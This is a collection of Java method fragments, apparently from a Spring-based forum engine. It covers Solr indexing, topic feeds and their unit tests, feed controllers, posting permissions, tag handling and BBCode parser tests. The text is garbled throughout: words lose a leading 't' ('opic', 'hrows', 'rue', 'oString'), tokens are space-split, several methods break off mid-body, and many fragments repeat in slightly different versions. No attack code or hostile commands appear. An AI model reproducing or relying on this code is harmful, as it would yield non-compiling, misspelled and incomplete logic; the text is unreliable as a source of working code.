private void updateMessage ( Topic opic ) hrows IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , opic . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " section " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , opic . getMessageId ( ) ) ; doc . addField ( " group_id " , opic . getGroupId ( ) ) ; doc . addField ( " itle " , StringEscapeUtils . unescapeHtml ( opic . getTitle ( ) ) ) ; doc . addField ( " opic_title " , opic . getTitle ( ) ) ; doc . addField ( " message " , msgbaseDao . getMessageText ( opic . getId ( ) ) . getText ( ) ) ; Date postdate = opic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
private static SolrInputDocument processComment ( Topic opic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " section " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , comment . getTopicId ( ) ) ; doc . addField ( " group_id " , opic . getGroupId ( ) ) ; String opicTitle = opic . getTitle ( ) ; doc . addField ( " opic_title " , StringEscapeUtils . unescapeHtml ( opicTitle ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( opicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . addField ( " itle " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , rue ) ; return doc ; } 
public static String encodeAndEscapeTopicName ( String url ) { if ( StringUtils . isBlank ( url ) ) { return url ; } String result = encodeTopicName ( url ) ; try { result = URLEncoder . encode ( result , " UTF-8 " ) ; } catch ( UnsupportedEncodingException e ) { } 
public static String encodeTopicName ( String url ) { if ( StringUtils . isBlank ( url ) ) { return url ; } return StringUtils . replace ( url , " " , " _ " ) ; } 
public static String buildWikiURL ( String virtualWiki , String opic ) { StringBuilder url = new StringBuilder ( ) ; url . append ( " /wiki/ " ) ; url . append ( encodeAndEscapeTopicName ( virtualWiki ) ) ; url . append ( '/' ) ; url . append ( encodeAndEscapeTopicName ( opic ) ) ; return url . oString ( ) ; } 
List < Topic > getTopics ( TopicListDto opicListDto ) ; List < TopicListDto . DeletedTopic > getDeletedTopics ( Integer sectionId ) ; } 
List < TopicListDto . DeletedTopic > getDeletedTopics ( Integer sectionId ) ; } 
public void copy ( TopicListDto opicListDto ) { sections . clear ( ) ; sections . addAll ( opicListDto . getSections ( ) ) ; userId = opicListDto . getUserId ( ) ; userFavs = opicListDto . isUserFavs ( ) ; group = opicListDto . getGroup ( ) ; ag = opicListDto . getTag ( ) ; limit = opicListDto . getLimit ( ) ; offset = opicListDto . getOffset ( ) ; dateLimitType = opicListDto . getDateLimitType ( ) ; fromDate = opicListDto . getFromDate ( ) ; oDate = opicListDto . getToDate ( ) ; notalks = opicListDto . isNotalks ( ) ; ech = opicListDto . isTech ( ) ; commitMode = opicListDto . getCommitMode ( ) ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , Integer offset , Integer year , Integer month ) hrows UserErrorException , TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . oString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( ag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . oString ( ) ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . getSections ( ) . add ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { opicListDto . setTag ( agDao . getTagId ( ag ) ) ; } if ( month ! = null & & year ! = null ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; opicListDto . setToDate ( calendar . getTime ( ) ) ; } else { opicListDto . setLimit ( 20 ) ; opicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( opicListDto ) ; } 
public void getTopicsFeedYear_commonTest ( ) hrows UserErrorException , TagNotFoundException { List < Topic > opicList = opicListService . getTopicsFeed ( section1 , group , " LOR " , null , 2000 , 11 ) ; assertEquals ( 1 , opicListDto . getSections ( ) . size ( ) ) ; Integer sectionId = opicListDto . getSections ( ) . iterator ( ) . next ( ) ; assertEquals ( new Integer ( 11 ) , sectionId ) ; assertEquals ( 111 , opicListDto . getGroup ( ) ) ; assertEquals ( 123 , opicListDto . getTag ( ) ) ; assertEquals ( TopicListDto . DateLimitType . BETWEEN , opicListDto . getDateLimitType ( ) ) ; assertEquals ( TopicListDao . CommitMode . COMMITED_ONLY , opicListDto . getCommitMode ( ) ) ; } 
public void getTopicsFeedYear_monthAndYearTest ( ) hrows UserErrorException , TagNotFoundException { List < Topic > opicList = opicListService . getTopicsFeed ( section1 , group , " LOR " , null , 2000 , 11 ) ; assertEquals ( TopicListDto . DateLimitType . BETWEEN , opicListDto . getDateLimitType ( ) ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( 2000 , 10 , 1 , 0 , 0 , 0 ) ; assertEquals ( calendar . getTime ( ) . getTime ( ) / 1000 , opicListDto . getFromDate ( ) . getTime ( ) / 1000 ) ; calendar . set ( 2000 , 11 , 1 , 0 , 0 , 0 ) ; assertEquals ( calendar . getTime ( ) . getTime ( ) / 1000 , opicListDto . getToDate ( ) . getTime ( ) / 1000 ) ; assertTrue ( opicListDto . getLimit ( ) = = null ) ; opicList = opicListService . getTopicsFeed ( section2 , null , null , 0 , null , null ) ; assertEquals ( TopicListDto . DateLimitType . MONTH_AGO , opicListDto . getDateLimitType ( ) ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; assertEquals ( calendar . getTime ( ) . getTime ( ) / 1000 , opicListDto . getFromDate ( ) . getTime ( ) / 1000 ) ; assertTrue ( opicListDto . getToDate ( ) = = null ) ; assertEquals ( new Integer ( 20 ) , opicListDto . getLimit ( ) ) ; assertTrue ( opicListDto . getOffset ( ) = = null ) ; } 
public void getUserTopicsFeedTest ( ) hrows UserErrorException , TagNotFoundException { User user = mock ( User . class ) ; when ( user . getId ( ) ) . henReturn ( 12345 ) ; List < Topic > opicList = opicListService . getUserTopicsFeed ( user , 123 , rue ) ; assertEquals ( new Integer ( 20 ) , opicListDto . getLimit ( ) ) ; assertEquals ( new Integer ( 123 ) , opicListDto . getOffset ( ) ) ; assertEquals ( TopicListDao . CommitMode . ALL , opicListDto . getCommitMode ( ) ) ; assertEquals ( 12345 , opicListDto . getUserId ( ) ) ; assertTrue ( opicListDto . isUserFavs ( ) ) ; } 
public TagDao getTagDao ( ) hrows Exception { TagDao agDao = mock ( TagDao . class ) ; when ( agDao . getTagId ( " LOR " ) ) . henReturn ( 123 ) ; return agDao ; } 
public < T > void storeToCache ( String key , T value , int expire ) { } @Override public < T > void storeToCache ( String key , T value ) { } } ; return cacheProvider ; } } 
public < T > void storeToCache ( String key , T value ) { } } ; return cacheProvider ; } } 
public void mainTopicsFeedHandler ( ) hrows Exception { } } 
public void getUserTopicsFeedWithSectionTest ( ) hrows UserErrorException , TagNotFoundException { User user = mock ( User . class ) ; when ( user . getId ( ) ) . henReturn ( 12345 ) ; List < Topic > opicList = opicListService . getUserTopicsFeed ( user , section1 , 123 , rue ) ; assertEquals ( 1 , opicListDto . getSections ( ) . size ( ) ) ; Integer sectionId = opicListDto . getSections ( ) . iterator ( ) . next ( ) ; assertEquals ( new Integer ( 11 ) , sectionId ) ; assertEquals ( new Integer ( 20 ) , opicListDto . getLimit ( ) ) ; assertEquals ( new Integer ( 123 ) , opicListDto . getOffset ( ) ) ; assertEquals ( TopicListDao . CommitMode . ALL , opicListDto . getCommitMode ( ) ) ; assertEquals ( 12345 , opicListDto . getUserId ( ) ) ; assertTrue ( opicListDto . isUserFavs ( ) ) ; } 
public ModelAndView gallery ( HttpServletRequest request , TopicListForm opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_GALLERY ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView forum ( HttpServletRequest request , TopicListForm opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_FORUM ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; modelAndView . addObject ( " url " , " /forum/lenta " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView polls ( HttpServletRequest request , TopicListForm opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_POLLS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; modelAndView . addObject ( " url " , " /polls/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView news ( HttpServletRequest request , TopicListForm opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_NEWS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; modelAndView . addObject ( " url " , " /news/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView galleryGroup ( HttpServletRequest request , TopicListForm opicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_GALLERY ) ; return group ( request , opicListForm , groupName , response ) ; } 
public ModelAndView newsGroup ( HttpServletRequest request , TopicListForm opicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_NEWS ) ; return group ( request , opicListForm , groupName , response ) ; } 
public ModelAndView pollsGroup ( HttpServletRequest request , TopicListForm opicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_POLLS ) ; return group ( request , opicListForm , groupName , response ) ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , TopicListForm opicListForm , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . getSection ( section ) ) ; opicListForm . setYear ( year ) ; opicListForm . setMonth ( month ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
private void prepareTopicsForPlainOrRss ( HttpServletRequest request , ModelAndView modelAndView , TopicListForm opicListForm , List < Topic > messages ) { boolean rss = opicListForm . getOutput ( ) ! = null & & " rss " . equals ( opicListForm . getOutput ( ) ) ; if ( rss ) { modelAndView . addObject ( 
private ModelAndView group ( HttpServletRequest request , TopicListForm opicListForm , String groupName , HttpServletResponse response ) hrows Exception { Section section = sectionService . getSection ( opicListForm . getSection ( ) ) ; Group group = groupDao . getGroup ( section , groupName ) ; opicListForm . setGroup ( group . getId ( ) ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; modelAndView . addObject ( " url " , group . getUrl ( ) ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; Section section = null ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; modelAndView . addObject ( " section " , section ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 1 ) ; List < Topic > messages = opicListService . getAllTopicsFeed ( section , calendar . getTime ( ) ) ; modelAndView . addObject ( " messages " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , mpl . getCurrentUser ( ) ) ) ; List < TopicListDto . DeletedTopic > deleted = opicListService . getDeletedTopicsFeed ( sectionId ) ; modelAndView . addObject ( " deletedTopics " , deleted ) ; modelAndView . addObject ( " sections " , sectionService . getSectionList ( ) ) ; return modelAndView ; } 
public ModelAndView gallery ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_GALLERY ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView forum ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_FORUM ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; modelAndView . addObject ( " url " , " /forum/lenta " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView polls ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_POLLS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; modelAndView . addObject ( " url " , " /polls/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView news ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_NEWS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; modelAndView . addObject ( " url " , " /news/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView galleryGroup ( HttpServletRequest request , TopicListRequest opicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_GALLERY ) ; return group ( request , opicListForm , groupName , response ) ; } 
public ModelAndView newsGroup ( HttpServletRequest request , TopicListRequest opicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_NEWS ) ; return group ( request , opicListForm , groupName , response ) ; } 
public ModelAndView pollsGroup ( HttpServletRequest request , TopicListRequest opicListForm , @PathVariable ( " group " ) String groupName , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_POLLS ) ; return group ( request , opicListForm , groupName , response ) ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , TopicListRequest opicListForm , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . getSection ( section ) ) ; opicListForm . setYear ( year ) ; opicListForm . setMonth ( month ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
private void prepareTopicsForPlainOrRss ( HttpServletRequest request , ModelAndView modelAndView , TopicListRequest opicListForm , List < Topic > messages ) { boolean rss = opicListForm . getOutput ( ) ! = null & & " rss " . equals ( opicListForm . getOutput ( ) ) ; if ( rss ) { modelAndView . addObject ( 
private ModelAndView group ( HttpServletRequest request , TopicListRequest opicListForm , String groupName , HttpServletResponse response ) hrows Exception { Section section = sectionService . getSection ( opicListForm . getSection ( ) ) ; Group group = groupDao . getGroup ( section , groupName ) ; opicListForm . setGroup ( group . getId ( ) ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; modelAndView . addObject ( " url " , group . getUrl ( ) ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public void getUserTopicsFeedWithSectionAndGroupTest ( ) hrows UserErrorException , TagNotFoundException { User user = mock ( User . class ) ; when ( user . getId ( ) ) . henReturn ( 12345 ) ; List < Topic > opicList = opicListService . getUserTopicsFeed ( user , section1 , group , 123 , rue ) ; assertEquals ( 1 , opicListDto . getSections ( ) . size ( ) ) ; Integer sectionId = opicListDto . getSections ( ) . iterator ( ) . next ( ) ; assertEquals ( new Integer ( 11 ) , sectionId ) ; assertEquals ( 111 , opicListDto . getGroup ( ) ) ; assertEquals ( new Integer ( 20 ) , opicListDto . getLimit ( ) ) ; assertEquals ( new Integer ( 123 ) , opicListDto . getOffset ( ) ) ; assertEquals ( TopicListDao . CommitMode . ALL , opicListDto . getCommitMode ( ) ) ; assertEquals ( 12345 , opicListDto . getUserId ( ) ) ; assertTrue ( opicListDto . isUserFavs ( ) ) ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , TopicListRequest opicListForm , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . getSection ( section ) ) ; opicListForm . setYear ( year ) ; opicListForm . setMonth ( month ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public boolean isTopicPostingAllowed ( User currentUser ) { if ( restrictTopics = = 0 ) { return rue ; } if ( currentUser = = null ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } if ( restrictTopics = = - 1 ) { return currentUser . isModerator ( ) ; 
public boolean isCommentPostingAllowed ( User currentUser ) { if ( ! ( restrictComments ! = 0 ) ) { return rue ; } if ( restrictComments = = - 1 ) { return currentUser . isModerator ( ) ; } return currentUser . getScore ( ) > = restrictComments ; } 
public static Group buildGroup ( ResultSet rs ) hrows SQLException { int restrict_topics = rs . getInt ( " restrict_topics " ) ; if ( rs . wasNull ( ) ) { restrict_topics = TopicPermissionService . POSTSCORE_UNRESTRICTED ; } Group group = new Group ( rs . getBoolean ( " moderate " ) , rs . getBoolean ( " imagepost " ) , rs . getBoolean ( " vote " ) , rs . getBoolean ( " havelink " ) , rs . getInt ( " section " ) , rs . getString ( " linktext " ) , rs . getString ( " urlname " ) , rs . getString ( " image " ) , restrict_topics , rs . getInt ( " restrict_comments " ) , rs . getInt ( " id " ) , rs . getInt ( " stat1 " ) , rs . getInt ( " stat2 " ) , rs . getInt ( " stat3 " ) , rs . getBoolean ( " resolvable " ) ) ; group . setTitle ( rs . getString ( " itle " ) ) ; group . setInfo ( rs . getString ( " info " ) ) ; group . setLongInfo ( rs . getString ( " longinfo " ) ) ; return group ; } 
public boolean isTopicPostingAllowed ( User currentUser ) { if ( restrictTopics = = TopicPermissionService . POSTSCORE_UNRESTRICTED ) { return rue ; } if ( currentUser = = null ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } if ( restrictTopics = = TopicPermissionService . POSTSCORE_MODERATORS_ONLY ) { return currentUser . isModerator ( ) ; 
public Group mapRow ( ResultSet resultSet , int i ) hrows SQLException { return Group . buildGroup ( resultSet ) ; } 
public Group mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return Group . buildGroup ( rs ) ; } 
public boolean isTopicPostingAllowed ( Group group , User currentUser ) { int groupRestriction = group . getTopicRestriction ( ) ; if ( groupRestriction = = TopicPermissionService . POSTSCORE_UNRESTRICTED ) { return rue ; } if ( currentUser = = null ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } if ( groupRestriction = = TopicPermissionService . POSTSCORE_MODERATORS_ONLY ) { return currentUser . isModerator ( ) ; 
public boolean isTopicPostingAllowed ( Group group , User currentUser ) { int restriction = getEffectivePostscore ( group ) ; if ( restriction = = TopicPermissionService . POSTSCORE_UNRESTRICTED ) { return rue ; } if ( currentUser = = null | | currentUser . isAnonymous ( ) ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } if ( restriction = = TopicPermissionService . POSTSCORE_MODERATORS_ONLY ) { return currentUser . isModerator ( ) ; 
public boolean isDeletable ( Topic opic , User user ) { boolean perm = isDeletableByUser ( opic , user ) ; if ( ! perm & & user . isModerator ( ) ) { perm = isDeletableByModerator ( opic , user ) ; } if ( ! perm ) { return user . isAdministrator ( ) ; } return perm ; } 
private boolean isDeletableByUser ( Topic opic , User user ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . HOUR_OF_DAY , - 1 ) ; Timestamp hourDeltaTime = new Timestamp ( calendar . getTimeInMillis ( ) ) ; return ( opic . getPostdate ( ) . compareTo ( hourDeltaTime ) > = 0 & & opic . getUid ( ) = = user . getId ( ) ) ; } 
public boolean isDeletable ( ) { return deletable ; } 
public boolean apply ( EditInfoDto input ) { return input . getEditor ( ) ! = message . getUid ( ) ; } 
public User apply ( EditInfoDto input ) { ry { return userDao . getUserCached ( input . getEditor ( ) ) ; 
public boolean apply ( EditInfoDto input ) { return input . getEditor ( ) ! = message . getUid ( ) ; } 
public Integer apply ( EditInfoDto input ) { return input . getEditor ( ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( addTopicRequestValidator ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public static EditInfoDto createFromMessage ( TagService agService , Topic message , String ext ) { EditInfoDto current = new EditInfoDto ( ) ; current . setOldmessage ( ext ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( TagService . oString ( agService . getMessageTags ( message . getMessageId ( ) ) ) ) ; current . setOldlinktext ( message . getLinktext ( ) ) ; current . setOldurl ( message . getUrl ( ) ) ; return current ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( editTopicRequestValidator ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public int getTagId ( String ag ) hrows UserErrorException , TagNotFoundException { List < Integer > res = jdbcTemplate . queryForList ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " , Integer . class , ag ) ; if ( res . isEmpty ( ) ) { hrow new TagNotFoundException ( ) ; 
public int getTagId ( String ag ) hrows UserErrorException , TagNotFoundException { checkTag ( ag ) ; return agDao . getTagId ( ag ) ; } 
public boolean updateTags ( final int msgId , final List < String > agList ) { return agDao . updateTags ( msgId , agList ) ; } 
public void updateCounters ( final List < String > oldTags , final List < String > newTags ) { agDao . updateCounters ( oldTags , newTags ) ; } 
private boolean isGoodTag ( String ag ) { return agRE . matcher ( ag ) . matches ( ) ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , Integer offset , Integer year , Integer month ) hrows UserErrorException , TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . oString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( ag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . oString ( ) ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . getSections ( ) . add ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { opicListDto . setTag ( agService . getTagId ( ag ) ) ; } if ( month ! = null & & year ! = null ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; opicListDto . setToDate ( calendar . getTime ( ) ) ; } else { opicListDto . setLimit ( 20 ) ; opicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( opicListDto ) ; } 
public TagService getTagService ( ) hrows Exception { TagService agService = mock ( TagService . class ) ; when ( agService . getTagId ( " LOR " ) ) . henReturn ( 123 ) ; return agService ; } 
public TagDao getTagDao ( ) hrows Exception { TagDao agDao = mock ( TagDao . class ) ; return agDao ; } 
private static synchronized int getOrCreateTag ( Connection con , String ag ) hrows SQLException { PreparedStatement st2 = con . prepareStatement ( " SELECT id FROM tags_values WHERE value=? " ) ; st2 . setString ( 1 , ag ) ; ResultSet rs = st2 . executeQuery ( ) ; int id ; if ( rs . next ( ) ) { id = rs . getInt ( " id " ) ; } else { PreparedStatement st = con . prepareStatement ( " INSERT INTO tags_values (value) VALUES(?) " ) ; st . setString ( 1 , ag ) ; st . executeUpdate ( ) ; st . close ( ) ; rs = st2 . executeQuery ( ) ; rs . next ( ) ; id = rs . getInt ( " id " ) ; } rs . close ( ) ; st2 . close ( ) ; return id ; } 
public void processRow ( ResultSet rs ) hrows SQLException { ags . add ( rs . getString ( " value " ) ) ; } 
public void processRow ( ResultSet rs ) hrows SQLException { set . add ( rs . getString ( " value " ) ) ; } 
public void processRow ( ResultSet rs ) hrows SQLException { set . add ( rs . getString ( " firstchar " ) ) ; } 
public void processRow ( ResultSet resultSet ) hrows SQLException { builder . put ( resultSet . getString ( " value " ) , resultSet . getInt ( " counter " ) ) ; } 
public int getTagId ( String ag ) hrows UserErrorException , TagNotFoundException { List < Integer > res = jdbcTemplate . queryForList ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " , Integer . class , ag ) ; if ( res . isEmpty ( ) ) { hrow new TagNotFoundException ( ) ; 
public ModelAndView showDefaultTagListHandlertags ( ) { return showTagListHandler ( " " ) ; } 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter ) { ModelAndView modelAndView = new ModelAndView ( " ags " ) ; SortedSet < String > firstLetters = agService . getFirstLetters ( ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . first ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < String , Integer > ags = agService . getTagsByFirstLetter ( firstLetter ) ; modelAndView . addObject ( " ags " , ags ) ; return modelAndView ; } 
public String oldTagsRedirectHandler ( ) { return " redirect:/tags " ; } 
public void brTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [BR] " , false ) , " <p><br></p> " ) ; } 
public void boldTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [B]hello world[/b] " , false ) , " <p><b>hello world</b></p> " ) ; } 
public void italicTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [I]hello world[/i] " , false ) , " <p><i>hello world</i></p> " ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [S]hello world[/s] " , false ) , " <p><s>hello world</s></p> " ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [STRONG]hello world[/strong] " , false ) , " <p><strong>hello world</strong></p> " ) ; } 
public void quoteTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote]hello world[/QUOTE] " , false ) , citeHeader + " <p>hello world</p> " + citeFooter ) ; 
public void quoteParamTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [QUOTE=maxcom]hello world[/quote] " , false ) , citeHeader + " <p><cite>maxcom</cite></p><p>hello world</p> " + citeFooter ) ; 
public void quoteCleanTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote][/QUOTE] " , false ) , " " ) ; } 
public void urlTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [URL]http:linux.org.ru[/url] " , false ) , " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " ) ; } 
public void urlParamTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [url=http:linux.org.ru]linux[/URL] " , false ) , " <p><a href= \" http:linux.org.ru \" >linux</a></p> " ) ; } 
